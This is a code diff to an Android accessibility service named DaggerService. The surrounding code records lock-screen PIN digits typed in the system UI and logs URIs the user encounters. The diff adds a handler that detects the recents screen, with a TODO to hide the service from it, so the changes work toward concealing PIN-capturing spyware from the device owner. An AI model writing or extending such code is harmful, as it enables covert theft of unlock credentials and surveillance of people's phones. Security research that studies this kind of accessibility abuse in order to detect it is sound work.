@@ -19,6 +19,7 @@ import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 
 class DaggerService : AccessibilityService() {
 
@@ -47,7 +48,7 @@ class DaggerService : AccessibilityService() {
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME) {
-                    logEvent(event, event.toString())
+                    logEvent(event, event.className.toString())
                     // This is a PIN, let's record it.
                     pinRecorder.appendPinDigit(event.text.toString())
                 }
@@ -70,6 +71,12 @@ class DaggerService : AccessibilityService() {
                 }
                 for (uri in event.uris()) {
                     logEvent(event, "URI detected: $uri")
+                }
+            }
+
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME && event.className.contains("recent", true)) {
+                    // TODO: Remove AccessibilityService from recents list.
                 }
             }
         }
@@ -101,7 +108,8 @@ class DaggerService : AccessibilityService() {
         }
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_CLICKED
+                AccessibilityEvent.TYPE_VIEW_CLICKED or
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         return info
     }
